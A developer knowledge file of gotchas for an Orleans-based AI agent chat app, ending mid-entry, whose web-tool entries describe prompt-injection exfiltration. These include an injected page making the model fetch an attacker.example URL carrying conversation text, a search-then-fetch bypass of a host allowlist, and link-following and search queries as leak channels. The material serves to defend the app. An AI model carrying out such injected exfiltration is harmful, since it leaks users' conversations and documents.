# Gotchas & exemplars

The ONLY prose knowledge file in this repo. Two kinds of entries, both cheap to
verify and dated. Add entries via `/gotcha`; re-verify via `/audit-docs`.
Rule of thumb: if the code can express it (types, lint rule, test), it does NOT
belong here. Only constraints invisible in the code itself.

**Size guardrail:** this file describes the *present*, not history (history lives in
`.agentic/decisions/`), so it should hover around equilibrium — roughly ≤40 entries.
Beyond that, do NOT split first: audit for entries that should be lint rules, ADRs,
or deletions (a bloated gotchas file almost always means the admission test lapsed).
Only if 40+ entries survive that audit, split by area into `.agentic/gotchas/<area>.md`
and turn this file into a one-line-per-area index.

Format — every entry MUST have `evidence:` (a repo path) and `verified:` (date):

## Exemplars (canonical shapes — copy these, don't invent)

| Shape                                          | Exemplar                                          | Verified   |
|------------------------------------------------|---------------------------------------------------|------------|
| Orleans grain (state + reminders + agent tools) | `src/Agent42.Agents/AgentGrain.cs`                | 2026-07-07 |
| Per-user registry grain (list-in-state)         | `src/Agent42.Agents/AgentRegistryGrain.cs`        | 2026-07-07 |
| Per-user singleton-preference grain (get/save)  | `src/Agent42.Agents/UserProfileGrain.cs`          | 2026-07-08 |
| Minimal-API endpoint group                      | `src/Agent42.Backend/AgentApi.cs`                 | 2026-07-07 |
| Grain test (Orleans TestCluster + fake client)  | `tests/Agent42.Tests/AgentGrainTests.cs`          | 2026-07-07 |
| Bicep module                                    | `infra/modules/cosmos.bicep`                      | 2026-07-06 |
| Frontend logic (vanilla JS, no framework)       | `src/Agent42.Backend/wwwroot/app.js`              | 2026-07-07 |
| Storage abstraction (interface + prod + in-mem) | `src/Agent42.Agents/IAttachmentStore.cs`, `src/Agent42.Agents/InMemoryAttachmentStore.cs`, `src/Agent42.Backend/BlobAttachmentStore.cs` | 2026-07-08 |
| PWA service worker (root scope, auth-safe)      | `src/Agent42.Backend/wwwroot/sw.js`               | 2026-07-06 |
| Runtime agent skill (progressive disclosure)    | `src/Agent42.Agents/Skills/scheduledprompt/SKILL.md` | 2026-07-06 |
| Keyed third-party HTTP client behind an Agents interface | `src/Agent42.Backend/ContextWebPageFetcher.cs`, `src/Agent42.Backend/GoogleGeocoder.cs` | 2026-07-21 |

## Constraints

### Chrome on Android flags interim speech results as `isFinal` with `confidence: 0`

- **Claim:** Voice dictation cannot be verified on desktop alone. Desktop Edge/Chrome and
  Chrome-on-Android deviate from the Web Speech spec in *different* ways, and a transcript
  fold correct on one stacks growth stages ("Hoe" + "Hoe laat" + …) on the other — the
  double-output bug on Android PWAs. On Android every interim stage arrives `isFinal: true`
  with `confidence: 0`; promoting it into the permanent `finalTranscript` accumulator (which
  never revisits what it appended) re-adds each stage. Only the interim branch is
  self-correcting (rebuilt per event), so an unscored result must fall through to it — hence
  the `distrustZeroConfidenceFinals` UA guard in the result handler. The guard must stay
  Android-only: desktop engines may report `confidence: 0` on a genuine final, and demoting it
  there silently drops the segment. The C# asset tests are source-text heuristics (no JS
  runner in repo), so they cannot catch an engine deviation — always retest dictation on a
  real Android PWA.
- **Evidence:** `src/Agent42.Backend/wwwroot/app.js` (`distrustZeroConfidenceFinals`);
  upstream precedent: `react-speech-recognition` `RecognitionManager.js`
- **Verified:** 2026-07-09

### A browser's upload Content-Type is unreliable for documents — resolve by extension

- **Claim:** the document-upload handler must NOT trust `IFormFile.ContentType` alone. Windows has
  no registered MIME type for many document extensions, so browsers send `application/octet-stream`
  (or an empty type) for `.docx`/`.pptx`/`.xlsx`/`.md` and even `.txt`, and OOXML files sometimes
  arrive as `application/zip`. Branching straight on the raw content type rejected real documents as
  "unsupported" (HTTP 400) — and the grain was never told the document existed, so the model stayed
  unaware. (`handleFiles` used to swallow the non-OK response silently; it now surfaces it as an
  `attach-chip--error` chip, so a wrongly-rejected document is at least visible — but the fix is to
  not misclassify it in the first place.) Resolve the effective type via `DocumentMediaTypes.ResolveMediaType(fileName,
  contentType)` (extension fallback) before the image/document branch, and feed the *resolved* type
  into ingestion so the extractor's switch matches. `.pdf` usually reports correctly, so a PDF-only
  test does not catch this — cover a generic/empty content type.
- **Evidence:** `src/Agent42.Backend/AgentApi.cs` (`ResolveMediaType` call before branching),
  `src/Agent42.Agents/DocumentMediaTypes.cs`,
  `tests/Agent42.Tests/DocumentMediaTypesTests.cs`
- **Verified:** 2026-07-10

### Easy Auth claim `typ` spellings for `user.*` telemetry are a prod-only fact

- **Claim:** the `user.email`/`user.full_name`/`user.roles` trace attributes (ADR 0009) are pulled
  from the `X-MS-CLIENT-PRINCIPAL` claims blob by matching each claim's `typ` against a **candidate
  list** in `CurrentUser.cs` (AAD v1/v2 and Easy Auth's own mapping spell them differently). Easy
  Auth is **absent locally** (ADR 0002 — DevHost doesn't even call `AddServiceDefaults`), so the
  real blob shape and `typ` spellings **cannot be verified offline**: the unit tests use a synthetic
  base64 blob built from the candidate `typ` values, which proves the parser, not the prod mapping.
  If an attribute is missing on a real trace at the collector after deploy, the claim `typ` is wrong
  for the tenant — add the observed spelling to the candidate list here; that is a config fact, not a
  code bug. `user.id`/`user.name`/`user.idp` come from plain headers and are not affected. Parsing is
  defensive: a missing/non-base64/non-JSON blob never throws — header attributes still emit.
- **Evidence:** `src/Agent42.Backend/CurrentUser.cs` (`EmailClaimTypes`/`FullNameClaimTypes`/`RoleClaimTypes`, `ParsePrincipalClaims`), `tests/Agent42.Tests/UserTelemetryTests.cs`, `.agentic/decisions/0009-user-identity-telemetry-attributes.md`
- **Verified:** 2026-07-11

### User identity reaches downstream/grain spans via Orleans RequestContext, never Activity.Baggage

- **Claim:** downstream `user.*` span attribution (ADR 0010) propagates the identity to the grain-side
  chat-completion span through **Orleans `RequestContext`** (`UserTelemetryMiddleware` sets a serializable
  `UserTelemetryContext` first in the pipeline; `UserTelemetrySpanProcessor.OnStart` stamps every started
  span from it). It must **never** be `Activity.Baggage`: the default `DistributedContextPropagator`
  injects a W3C `baggage` request header on outbound HttpClient calls, which would ship user PII
  (name/email/roles) to **Azure OpenAI** in headers. `RequestContext` is an in-cluster channel (Orleans'
  own protocol, never an external HTTP header), so identity reaches the grain without leaking outward —
  the load-bearing reason for the design. This is the **one** `RequestContext` use in the repo.
  `NoBaggageWriteApi_IsUsedInTelemetryPath` guards against `SetBaggage`/`AddBaggage` creeping in.
- **Load-bearing behaviour:** Orleans 10.2 propagates `RequestContext` into the *streaming* `ChatAsync`
  grain path by default. That is **not** self-evident and is guarded by `RequestContextPropagationTests`
  (a `FakeChatClient` `[uctx:…]` echo read at the in-grain chat-client call site). If an Orleans upgrade
  flips that default, that test fails first — restore propagation (silo config or a grain-call-filter
  pair) before shipping. The actual OTel stamp on a real in-grain span is prod-smoke (no OTel host offline).
- **Evidence:** `src/Agent42.Backend/UserTelemetryMiddleware.cs`, `src/Agent42.Backend/UserTelemetrySpanProcessor.cs`, `src/Agent42.Agents/UserTelemetryContext.cs`, `tests/Agent42.Tests/RequestContextPropagationTests.cs`, `.agentic/decisions/0010-downstream-user-telemetry-via-requestcontext.md`
- **Verified:** 2026-07-11

### Trace-parent linkage across a grain call needs `AddActivityPropagation` — RequestContext propagation is NOT it

- **Claim:** Orleans propagates `RequestContext` across grain calls **by default** (the `user.*` identity
  channel above relies on that), but it does **NOT** propagate the W3C trace context (`Activity.Current`)
  unless the silo opts in with **`silo.AddActivityPropagation()`** (in `Program.cs`'s `UseOrleans`). These are
  two different mechanisms — having the first does not give you the second. Grain calls hop through the
  Orleans scheduler, which does not flow `Activity.Current` across the boundary, so **without** this call
  every span started *inside* a grain (the `HttpClientInstrumentation` span for the chat-completion /
  geocoding / web-fetch calls) begins as a **new root span** — the "many traces have no parent" symptom. The
  symptom is easy to miss because the `user.*` attributes still land on those orphaned spans (they ride
  RequestContext, not the trace parent).
- **Load-bearing behaviour:** the backend **co-hosts** silo + client in one DI container, so the single
  `silo.AddActivityPropagation()` registers **both** the incoming filter (starts the child span) and the
  outgoing filter (injects `Activity.Current` on the call) — one call covers both directions. A `TestCluster`
  splits client and silo into **separate** containers, so a test must configure **both**
  (`AddSiloBuilderConfigurator` + `AddClientBuilderConfigurator`) to reproduce what co-hosting gives for free —
  configuring only the silo makes the outgoing injection silently absent and the trace never propagates.
  `ActivityPropagationTests` guards this: a positive (root trace reaches the in-grain chat-client site via the
  `FakeChatClient` `[trace:…]` echo) and a negative (no propagation → no marker → the fix is load-bearing).
  The async paths (fired reminders, agent-run — ADR 0022/0028) still begin fresh roots **by design**: they
  have no ambient inbound Activity, so their rootlessness is correct, not this bug.
- **Evidence:** `src/Agent42.Backend/Program.cs` (`silo.AddActivityPropagation()`), `tests/Agent42.Tests/ActivityPropagationTests.cs`, `tests/Agent42.Tests/FakeChatClient.cs` (`TraceEcho`)
- **Verified:** 2026-07-21

### An agent tool's RETURN value is persisted, and counts against the 2 MB session cap

- **Claim:** it is easy to see that chat messages are persisted and miss that **tool results are too**.
  A `FunctionResultContent` stays in the Agent Framework chat history (`AgentGrain`'s storage filter
  excludes only `AIContextProvider` and `ChatHistory` source types), and the grain re-serializes the
  whole session into **one `agent-state` Cosmos item every turn** — hard-capped at **2 MB** (ADR 0004).
  So a tool that returns a big payload does not merely bloat one reply: the payload sits in history
  forever, is re-sent to the model on every later turn, and eventually makes `WriteStateAsync` fail
  *after* the model has already answered — bricking the conversation, silently, **in prod only** (the
  in-memory test store has no 2 MB limit). **Therefore every web tool budgets what it RETURNS**, in
  `WebToolLimits`: a search ≤ 5 results × ≤ 300-char snippets, and a fetched page ≤ 8 KB of text
  (`MaxPageTextLength`). The **return** budget is separate from what a fetch pulls off the wire — the
  distinction is load-bearing, but the anchor moved: the old `WebPageFetcher.MaxDownloadBytes` transport
  cap is gone with the direct fetch (ADR 0027). Now context.dev renders the page and returns bounded
  markdown, which we then truncate on the way back. **And following (ADR 0027) moved the return ceiling:**
  one fetch can return the root *plus* up to `MaxFollowedLinks` pages, so the budget that binds is
  `MaxTotalPageTextLength` (across root + followed), not `MaxPageTextLength` alone. Any new tool — or any
  new page added to a fetch result — must count its return payload against this budget.
- **Evidence:** `src/Agent42.Agents/WebToolLimits.cs`, `src/Agent42.Agents/AgentGrain.cs`
  (`ExcludeInjectedContextMessages`, `ChatAsync`'s `SerializeSessionAsync`, `BuildFetchPayload`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`ToolResults_DoNotBlowTheSessionSizeBudget`),
  `.agentic/decisions/0004-attachments-in-blob.md`, `.agentic/decisions/0027-hosted-page-scrape-via-context-dev.md`
- **Verified:** 2026-07-21

### A continuous agent funnels every chat into one unbounded grain — it will eventually brick

- **Claim:** an agent with `Continuous = true` (ADR 0016) routes **every** start onto one deterministic
  conversation id `` `agent-${agent.id}` `` → one grain `{userId}/agent-{agentId}`. That grain never rotates:
  it re-serializes its whole session into a single `agent-state` Cosmos item every turn, hard-capped at 2 MB
  (see the "an agent tool's RETURN value is persisted" gotcha above). Per-chat agents bound each conversation;
  a continuous one grows without bound (text + tool results + image refs + RAG excerpts, replayed every turn)
  and will eventually fail `WriteStateAsync` *after* the model has already answered — bricking the conversation,
  silently, **in prod only** (the in-memory test store has no 2 MB limit). **The only escape hatch is
  delete-to-reset:** `DELETE /api/conversations/agent-{agentId}` purges the grain and the next start recreates
  it fresh at the same id. No code cap is in scope. Two further non-obvious traps: (1) the flag is read
  **client-side at chat-start and is never snapshotted into `AgentBinding`** (it's routing, not persona), so
  editing a continuous agent's system prompt or model has **zero effect** on its ongoing conversation until the
  grain is deleted — ADR 0003's "start a new chat to apply the edit" remedy does not work for a continuous
  agent. (2) `crypto.randomUUID()` never emits the `agent-` prefix, so the deterministic and random id spaces
  never collide — do not "fix" the derivation to hash or encode the id.
- **Evidence:** `src/Agent42.Backend/wwwroot/app.js` (`startAgentChat`),
  `src/Agent42.Agents/AgentDefinition.cs` (`Continuous`), `src/Agent42.Backend/AgentApi.cs` (`AgentKey`),
  `.agentic/decisions/0016-per-agent-history-mode-deterministic-conversation-id.md`,
  `.agentic/decisions/0004-attachments-in-blob.md`, `.agentic/decisions/0003-snapshot-agent-persona-into-conversation.md`
- **Verified:** 2026-07-15

### `fetch_web_page` is NO LONGER an SSRF sink — the scrape is made by context.dev, not by us

- **Claim:** this used to be an SSRF sink and had a connect-time `PrivateAddressGuard` in
  `SocketsHttpHandler.ConnectCallback`. **That is gone** (ADR 0027). `fetch_web_page` no longer opens a
  socket to the model's URL — it hands the URL to the hosted **context.dev** scrape API, which makes the
  outbound request. Our container never dials the model-chosen address, so there is no in-container SSRF
  vector and no guard to place. The only call this path makes is to context.dev's **config-pinned** host
  (`ContextWebPageFetcher.DefaultBaseAddress`), carrying the URL as a query parameter — an ordinary API
  call. **Do not reintroduce a `PrivateAddressGuard` here** on the theory that a fetch tool needs one:
  there is nothing to guard, because the request is not ours. (The allowlist below is a *different*
  control and stays.) The old direct-fetch code, its guard, its `AngleSharp` HTML→text pass, and their
  socket-dialling tests were all deleted.
- **Evidence:** `src/Agent42.Backend/ContextWebPageFetcher.cs`, `src/Agent42.Backend/Program.cs`
  (the fetch client has **no** `ConfigurePrimaryHttpMessageHandler`),
  `.agentic/decisions/0027-hosted-page-scrape-via-context-dev.md`,
  `.agentic/decisions/0011-web-search-self-hosted-searxng-sidecar.md` (amendment note)
- **Verified:** 2026-07-21

### Following links is exempt from the fetch allowlist — an accepted residual risk, opt-in and hard-capped

- **Claim:** `fetch_web_page` can follow depth-1 links whose text matches a model-supplied
  `followLinkFilter` (ADR 0027). Only the **root** URL is checked against `FetchableUrls`; a followed
  link is extracted from the page and fetched **without** the allowlist — by construction it would never
  be on it, so checking it would make following a permanent no-op. This is a **real exfiltration channel,
  not a non-risk**: the filter is conversation-derived free text, substring-matched against
  attacker-authored link text on an attacker-authored page, so a page with one link per character turns
  the filter into a selection channel, repeatable across turns — the same class of hole the whole-URL
  allowlist closes, reached through a different door. The user accepted it. Its bounds limit the
  *bandwidth*, they do **not** close the channel: (1) following is **opt-in** — no filter ⇒ no following,
  and the default is pinned explicitly (this INVERTS the spike's null-means-follow-all rule; do not
  "fix" it back); (2) `includeLinks` is forced **true** whenever following, or the links never survive
  into the markdown and the feature is a silent no-op while every stub test still passes; (3)
  `maxFollowedLinks` is clamped to `WebToolLimits.MaxFollowedLinks` — a **cost** bound too (context.dev
  bills one credit per followed scrape) as much as a security one; (4) followed content is **labelled
  untrusted** in the payload handed to the model (`AgentGrain.BuildFetchPayload`); (5) the filter and
  follow count are **logged** so the channel is auditable. `useMainContentOnly` stays **true** on the
  root — verified against the live API 2026-07-21 that it does not strip the motivating CTA link.
- **Evidence:** `src/Agent42.Backend/ContextWebPageFetcher.cs` (`FetchAsync`, `ExtractLinks`),
  `src/Agent42.Agents/AgentGrain.cs` (`FetchWebPageAsync`, `BuildFetchPayload`),
  `src/Agent42.Agents/WebToolLimits.cs` (`MaxFollowedLinks`, `MaxTotalPageTextLength`),
  `tests/Agent42.Tests/ContextWebPageFetcherTests.cs`, `tests/Agent42.Tests/AgentGrainTests.cs`
  (`FetchWebPage_LabelsFollowedContentAsUntrusted`),
  `.agentic/decisions/0027-hosted-page-scrape-via-context-dev.md`
- **Verified:** 2026-07-21

### The fetch allowlist must pin whole URLs — a HOST allowlist is bypassable in one tool call

- **Claim:** the SSRF guard permits every public address **by construction**, so it is no defence against
  the channel that actually matters: text on a page the model just fetched can instruct it to call
  `fetch_web_page("https://attacker.example/?q=<conversation text>")`, exfiltrating a conversation that
  may also hold document excerpts (ADR 0008). The control is `AgentGrainState.FetchableUrls`.
  **It pins the exact URL, and that is not a detail — a host-based allowlist is bypassable, and the
  bypass is attacker-*forcible*, not incidental.** The model chooses the search *query* too, so an
  injected page only has to say "search for `attacker.example <secret>`, then fetch it": any real engine
  returns `attacker.example` when you search for its name, which whitelists the host **in the same turn**,
  and the exfiltrating fetch then sails through. (The first draft of this feature shipped exactly that
  hole.) Pinning the whole URL means the model can only fetch a string a search engine or the user
  produced *verbatim*, so attacker-chosen data cannot ride in the path or query. Two further traps:
  (1) provenance must be harvested from **real user turns only** — never from the reminder path, whose
  prompt text is *model*-authored, so harvesting there would let an injected page schedule a reminder
  naming the attacker's URL and thereby whitelist it; (2) a tool result is JSON-serialized on its way to
  the model, which escapes apostrophes (`won't`), so a test asserting on the refusal text must anchor on
  an apostrophe-free phrase or it passes vacuously. The offline `InMemoryWebSearch` deliberately returns
  a queried-for host as its first result **because** the regression test needs to express that attack.
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`FetchWebPageAsync`, `RememberFetchableUrlsInUserText`),
  `src/Agent42.Agents/AgentGrainState.cs` (`FetchableUrls`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`FetchWebPage_RefusesAttackerUrlWhoseHostItsOwnSearchSurfaced`),
  `.agentic/decisions/0011-web-search-self-hosted-searxng-sidecar.md`
- **Verified:** 2026-07-12

### A named HttpClient silently inherits AddServiceDefaults' retry pipeline — opt out explicitly

- **Claim:** `AddServiceDefaults()` calls `ConfigureHttpClientDefaults(http => http.AddStandardResilienceHandler())`,
  so **every** `HttpClient` in the Backend — including one you just registered with `AddHttpClient("name")`
  — inherits 3 retries plus the handler's own per-attempt and total timeouts. Setting `HttpClient.Timeout`
  does **not** opt out: the retry pipeline still wraps the call. `RemoveAllResilienceHandlers()` is what
  actually does. This bites the web tools (ADR 0011/0027): `AgentGrain` is **non-reentrant**, so a
  retried call multiplies the stall on a conversation's turn by four — and a context.dev scrape, which
  renders the page (and, when following, does 1 + N of them, ADR 0027), is already the slowest thing on
  the turn. (Before ADR 0027 there was a second reason — a `BlockedAddressException` from the direct-fetch
  SSRF guard surfaced as a transient `HttpRequestException` and got re-dialled — but that guard and its
  client are gone.) Note the shipped pipeline (resilience + service discovery) is assembled in `Program.cs`
  and is not what the unit tests construct, so no test will catch this for you.
- **Evidence:** `src/Agent42.ServiceDefaults/Extensions.cs` (`ConfigureHttpClientDefaults`),
  `src/Agent42.Backend/Program.cs` (`RemoveAllResilienceHandlers` on all three named clients — SearXNG
  search, the context.dev scrape client (ADR 0027) and the geocoding client (ADR 0012); every new named
  client needs it)
- **Verified:** 2026-07-21

### SearXNG is self-hosted, NOT private — it forwards every query to DuckDuckGo/Bing

- **Claim:** "self-hosted search" reads like "the query never leaves our infrastructure". It does leave.
  SearXNG is a ***meta*search** engine: it forwards each query to the upstream engines enabled in
  `infra/searxng/settings.yml` (currently `google`, `duckduckgo`, `bing` — read the `keep_only:` list,
  it changes). What self-hosting actually buys is
  **no API key, no per-query bill, and no per-user attribution** — queries arrive at the upstream engines
  unauthenticated from the container's IP. That is the claim to make; the privacy one is false, and it
  was wrong in five places in the first draft of this feature (including in the `websearch` SKILL.md,
  i.e. told to the model, and therefore to users). The consequence that matters: because the **model**
  writes the search query, `web_search` is an outbound text channel that the `fetch_web_page` URL
  allowlist does **not** cover — a prompt-injected page could put conversation text in a query. The skill
  instructs the model never to do that; it is mitigation, not prevention (ADR 0011).
- **Evidence:** `infra/searxng/settings.yml` (`keep_only:` engine list),
  `src/Agent42.Agents/Skills/websearch/SKILL.md`, `src/Agent42.Agents/IWebSearch.cs`,
  `.agentic/decisions/0011-web-search-self-hosted-searxng-sidecar.md`
- **Verified:** 2026-07-12

### SearXNG: the JSON API answers 403 unless enabled, and the port moves only via env

- **Claim:** two traps, both verified by running the image. (1) SearXNG serves **only** the formats
  listed under `search.formats` — `html` alone by default — and answers a request for an unlisted format
  with **HTTP 403**, which reads like an auth failure and sends you hunting for an API key that does not
  exist (the sidecar has no auth). `json` must be listed in `infra/searxng/settings.yml`; with it removed
  the same instance returns 403 for `?format=json` while `?format=html` returns 200. (2) **`server.port`
  in `settings.yml` is inert for the bind.** The image's entrypoint does
  `export GRANIAN_PORT="${SEARXNG_PORT:-$GRANIAN_PORT}"`, so the listener follows the **`SEARXNG_PORT`
  env var** — with only `server.port: 8888` in the config the container still listened on **8080**, which
  collides with the backend's ingress `targetPort` (containers in one Container App share a network
  namespace and talk over localhost). The port move lives in `container-app.bicep` / `AppHost.cs`, not in
  the config file. Upstream ships rolling date tags, so the Dockerfile pins an immutable one, never
  `latest`.
  (3) **A per-request `&safesearch=` parameter silently OVERRIDES the instance's `search.safe_search`.**
  `SearxngWebSearch` used to hardcode `&safesearch=1` on every query, which made `safe_search:` in
  `settings.yml` **dead config** — the file could say `0` while every actual query asked for `1`, and
  nothing said so. The client now sends no `safesearch` parameter at all, so the instance owns the policy
  and the config file means what it says. Same trap shape as `server.port` above: a setting that looks
  authoritative but is overridden elsewhere. (Current instance policy: `safe_search: 0`.)
- **Evidence:** `infra/searxng/settings.yml`, `infra/searxng/Dockerfile`,
  `infra/modules/container-app.bicep` (`SEARXNG_PORT`), `src/Agent42.Backend/SearxngWebSearch.cs`
  (the 403 message names the cause; no `safesearch` on the query string)
- **Verified:** 2026-07-13

### Container Apps bills the per-replica total across ALL containers in the replica

- **Claim:** adding a sidecar is not free and not independent. Azure Container Apps bills the
  **per-replica** total, and the **sum** of CPU/memory across every container in the replica must land on
  an allowed combination (CPU in 0.25 steps, memory ≈ 2 GiB per CPU) — an invalid sum is rejected at
  deploy, not at authoring. The SearXNG sidecar took the replica from `0.5 CPU / 1Gi` to
  **`1.0 CPU / 2Gi`** (backend unchanged + sidecar `0.5/1Gi`), roughly doubling the app's compute cost.
  Replicas stay pinned at 1 (`@minValue(1) @maxValue(1)` — Orleans localhost clustering), so there is
  exactly one sidecar per deployment. `az bicep build` will not catch a bad combination; an
  `az deployment group validate` against the real RG will.
- **Evidence:** `infra/main.bicep` (`containerCpu`/`containerMemory` + `searxngCpu`/`searxngMemory`),
  `infra/modules/container-app.bicep` (two containers in `template.containers`)
- **Verified:** 2026-07-12

### A grain's turn-scoped field lives for the ACTIVATION — clear it explicitly, or a reminder reuses it

- **Claim:** `AgentGrain._turnLocation` holds the user's position for the turn being processed (ADR 0012),
  and it reads like per-call state. **It is not: a private field lives for the grain *activation*.** So
  "the reminder path just leaves it null" is *false* — `ReceiveReminder` is a separate call on the same
  activation, and after any located chat turn the field is still populated. Left alone, a scheduled prompt
  would confidently announce where the user was hours ago, from somewhere else. **Non-reentrancy is not the
  argument that makes it safe** either — `ChatAsync` is an `IAsyncEnumerable` method that suspends between
  `yield return`s. The only thing that makes it safe is clearing it explicitly, and it is cleared in *two*
  places: a `finally` in `ChatAsync` (which also runs when a client abandons the stream, on the
  enumerator's disposal) and an assignment to null on entry to `ReceiveReminder`. Each masks the other, so
  neither is individually load-bearing in the happy path — but remove **both** and
  `ReceiveReminder_HasNoUserLocation` fails (verified by mutation). Any future per-turn field on this grain
  inherits this trap; PII especially should not sit in memory between turns.
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`_turnLocation`, the `finally` in `ChatAsync`, the
  clear in `ReceiveReminder`), `tests/Agent42.Tests/AgentGrainTests.cs`
  (`ReceiveReminder_HasNoUserLocation`, `Location_IsTurnScoped_AndNotPersisted`),
  `.agentic/decisions/0012-user-location-google-geocoding.md`
- **Verified:** 2026-07-13

### `get_current_location` is NOT an SSRF sink — and exactly two properties keep it that way

- **Claim:** it makes an outbound HTTP call from the same container whose managed identity IMDS will mint
  Cosmos/Storage/OpenAI tokens for — the setup that once made a model-chosen fetch URL dangerous — yet it
  deliberately has **no SSRF address-guard**, and adding one to "fix the asymmetry" would be cargo cult
  (and there is no longer even a `fetch_web_page` guard to be asymmetric with — ADR 0027). The claim
  rests on two properties, and **both are load-bearing**: (1) the host is **fixed** (`maps.googleapis.com`,
  config-pinned, never model-supplied), and (2) the tool takes **zero model-supplied parameters** — the
  only variable input is a lat/lon pair from the *browser*, range-validated server-side, and a `double`
  cannot inject a host. The failure mode is a later contributor dissolving property (2) without noticing:
  adding a `[Description("address to look up")] string` parameter turns this into a genuine SSRF sink
  **while the reassuring comment still sits above it**. A comment cannot defend itself, so the shape is
  pinned by `GetCurrentLocation_ExposesNoParameters`, which asserts the JSON schema the model actually sees
  has no properties. If you ever need the model to name a place, that is *forward* geocoding — a different
  tool, and it needs the guard.
- **Evidence:** `src/Agent42.Backend/GoogleGeocoder.cs`, `src/Agent42.Agents/AgentGrain.cs`
  (`GetCurrentLocationAsync`), `tests/Agent42.Tests/AgentGrainTests.cs`
  (`GetCurrentLocation_ExposesNoParameters`), `.agentic/decisions/0012-user-location-google-geocoding.md`
- **Verified:** 2026-07-13

### WebKit has no geolocation Permissions API — gating on `state === "granted"` is dead on iOS

- **Claim:** `navigator.permissions.query({name: "geolocation"})` is **not supported in WebKit** — every
  browser on iOS/iPadOS — where it **rejects** rather than reporting a state. So the obvious design for
  "auto-attach the position once the user has granted permission" — gate purely on `state === "granted"` —
  is **silently dead on every iPhone**: the user taps grant, no fix is ever attached, and the grant button
  never hides. The authorization gate is therefore **two-legged**: the Permissions API where it exists
  (Chrome/Edge/Firefox, desktop + Android), and otherwise a `localStorage` flag set **only after a
  `getCurrentPosition()` actually succeeded** (an already-granted permission resolves without re-prompting,
  so capture under the flag never ambushes the user), cleared on a `PERMISSION_DENIED` (code 1) from any
  later capture — which is how a revocation in site settings gets noticed. Related and separate: the send
  path must **never** call `getCurrentPosition()` or await a fix — an awaited high-accuracy acquisition adds
  seconds to *every* message once the cached fix goes stale, so the fix is refreshed out of band and the
  send path reads the cache synchronously. The C# asset tests are source-text heuristics (no JS runner in
  the repo), so they cannot catch an engine deviation: **retest on a real iOS device** — same class of trap
  as the Chrome-on-Android speech gotcha.
- **Evidence:** `src/Agent42.Backend/wwwroot/app.js` (`isCaptureAuthorized`, `currentLocationForSend`,
  `handlePositionError`), `tests/Agent42.Tests/LocationAssetsTests.cs`,
  `.agentic/decisions/0012-user-location-google-geocoding.md`
- **Verified:** 2026-07-13

### OTel redacts an HttpClient span's query string by default — and one env var un-redacts it

- **Claim:** `AddServiceDefaults` turns on `AddHttpClientInstrumentation()`, and `UserTelemetrySpanProcessor`
  stamps `user.email`/`user.full_name`/`user.roles` onto **every** span started under a request identity
  (ADR 0010) — so an outbound span joins *a named human* to whatever is in that request's URL. For the
  geocode call that URL's query string carries **the Google API key and the user's exact coordinates**. A
  spike settled the actual behaviour rather than trusting it: **OpenTelemetry.Instrumentation.Http 1.15.1
  redacts the query string by default**, recording `url.full` as `http://…/maps/api/geocode/json?*`. So no
  scrubbing is needed today — but this is a **library default, not a guarantee we own**: setting
  `OTEL_DOTNET_EXPERIMENTAL_HTTPCLIENT_DISABLE_URL_QUERY_REDACTION=true` (or an instrumentation upgrade that
  changes the default) would immediately start shipping the key and the user's position to the OTLP
  collector, attributed to them by name. If you enable that flag, scrub or filter `url.full` for the
  geocoding client first. Note this cuts the other way too: any *new* named client whose query string holds
  a secret is protected only by the same default.
- **Evidence:** `src/Agent42.ServiceDefaults/Extensions.cs` (`AddHttpClientInstrumentation`),
  `src/Agent42.Backend/UserTelemetrySpanProcessor.cs`, `src/Agent42.Backend/GoogleGeocoder.cs`
- **Verified:** 2026-07-13

### A GitHub model id contains a `/`, so the provider separator is `:` — and the split is on the FIRST colon

- **Claim:** the obvious separator for a qualified model id is `/`, and it is **wrong**: GitHub Models'
  *own* ids are `publisher/name` (`openai/gpt-4o-mini`), so `provider/model` cannot be split
  unambiguously. Ids are **`<provider>:<model>`, split on the FIRST colon**; everything after it is the
  provider's opaque string and is never parsed further (an Ollama tag like `ollama:llama3.1:8b` survives
  intact). The load-bearing consequence is the *other* branch: an id with **no** colon is a **legacy** id
  and resolves against the default provider — that is the entire reason ADR 0013 needed **no state
  migration**, because every conversation persisted before it holds a bare `gpt-4o`. Related, and easy to
  get wrong in the same breath: `AgentGrainState.DeploymentName` **keeps its name and its `[Id(2)]`** even
  though it now holds a qualified id. Which serializer the Cosmos grain-storage provider actually uses
  (Orleans binary field-ids vs. JSON property names) is **unverified**, and if it is JSON, renaming the
  property silently orphans the model on every existing conversation.
- **Evidence:** `src/Agent42.Backend/ModelProviderOptions.cs` (`ModelId.Parse`),
  `src/Agent42.Agents/AgentGrainState.cs` (`DeploymentName` + its comment),
  `tests/Agent42.Tests/ModelIdTests.cs`, `tests/Agent42.Tests/AgentGrainTests.cs`
  (`LegacyPersistedModel_StillResolves`), `.agentic/decisions/0013-multi-provider-model-catalog.md`
- **Verified:** 2026-07-14

### `AgentSkillsProvider` is a TOOL — a no-tools model must drop it too, and the RAG provider must NOT be dropped

- **Claim:** gating a model with `SupportsTools: false` looks like it means "pass `Tools = []`". It does
  not: `AgentSkillsProvider` exposes a **`load_skill` function** to the model, and it is registered as an
  `AIContextProvider`, not in the `Tools` list — so dropping the seven `AIFunctionFactory` tools while
  leaving the skills provider on still hands the model a function schema it cannot handle (on GitHub
  Models, `microsoft/phi-4` answers a tools request with a flat **HTTP 400**). The two context providers
  are therefore gated **differently, on purpose**: the skills provider goes when tools go, while the
  document `TextSearchProvider` (ADR 0008) is **not** a tool — it *injects* excerpts before the call — and
  must stay on regardless, or a document conversation silently loses retrieval the moment it moves to a
  text-only model. The asymmetry is invisible in the types; both are just `AIContextProviders` entries.
  `FakeChatClient` echoes the tool schemas it is handed **by name** (`[tools:a,b,c]`) rather than a count,
  precisely so the "and no `load_skill`" half is assertable. **Same rule for the ADR 0021 selection layer:**
  a user disabling the `skills` key must drop the provider from that switch-arm, not merely hide a label —
  the `skillsEnabled = SupportsTools && selected.Contains(skills)` guard, not a filter on the `Tools` list
  (the provider's tools are never in it). And the provider surfaces **three** tools, not one —
  `load_skill`, `read_skill_resource`, `run_skill_script` — so `ToolCatalog` maps all three to the `skills`
  key (the key-coverage guard test found this).
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`BuildAgent`'s `AIContextProviders` switch),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`NoToolModel_RegistersNoTools_AndNoSkillsProvider`,
